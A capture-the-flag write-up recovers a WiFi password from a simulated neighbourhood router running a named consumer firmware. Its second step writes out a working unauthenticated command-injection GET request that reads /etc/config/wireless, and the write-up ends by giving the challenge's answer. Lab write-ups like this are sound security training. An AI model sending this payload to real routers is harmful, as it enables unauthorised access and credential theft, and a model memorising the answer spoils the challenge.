# 📡 Dosis Network Down – Router Forensics Write-Up

**Difficulty:** 2  
**Challenge Goal:**  
Recover the **WiFi password** from the neighborhood router after gnomes tampered with its configuration.

---

## 🧠 Scenario Summary

JJ’s 24-7 has lost internet access after some mischievous gnomes altered the neighborhood router settings.  
The router is owned by the neighborhood, so our task is to **legitimately recover** the configuration and restore connectivity.

Our mission:
- Analyze the router’s web interface
- Identify a known vulnerability
- Extract the wireless configuration
- Recover the WiFi password

<img width="622" height="445" alt="image" src="https://github.com/user-attachments/assets/2952b87f-38d1-432e-94c4-abcaa09c8ed0" />

---

## 🖥️ Target Information

**Device:** Dosis Neighborhood Core Router  
**Model:** Archer AX21 v2.0 (AX1800 Wi‑Fi 6 Router)

**Firmware Version:**  
```
1.1.4 Build 20230219 rel.69802
```

The router presents a standard login portal:

```
Dosis Neighborhood Core Router | AX1800 Wi‑Fi 6 Router
Log In with Local Password
```

The admin password has been changed, preventing normal access.

---

## 🛠️ Tools & References

- **Web Browser / HTTP Client**
- **Exploit Database**
- **Command Injection via HTTP GET**

### Known Vulnerability
A publicly documented vulnerability exists for this firmware:

🔗 **Exploit Reference:**  
https://www.exploit-db.com/exploits/51677

This exploit allows **unauthenticated command execution** via the LuCI interface.

---

## 🔍 Investigation Walkthrough

### Step 1: Identify the Vulnerable Endpoint

The router exposes the LuCI management interface:

```
/cgi-bin/luci/
```

The vulnerability allows command injection via the `country` parameter.

---

### Step 2: Exploit Command Injection

We craft a malicious GET request to read the wireless configuration file:

```http
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
```

This injects a system command that outputs the contents of:

```
/etc/config/wireless
```

---

### Step 3: Extract the WiFi Password

The HTTP response reveals the router’s wireless configuration, including the pre-shared key.

Among the output, the following value is exposed:

```
SprinklesAndPackets2025!
```

---

## 🧩 Final Findings

### ✅ WiFi Password (Answer)
```
SprinklesAndPackets2025!
```

---

## 🏁 Conclusion

This challenge demonstrates common real-world router weaknesses:

- Outdated firmware can expose critical vulnerabilities
- Unauthenticated command injection leads to full configuration disclosure
- WiFi credentials are often stored in plaintext configuration files

📡 Network restored — holiday cheer back online!
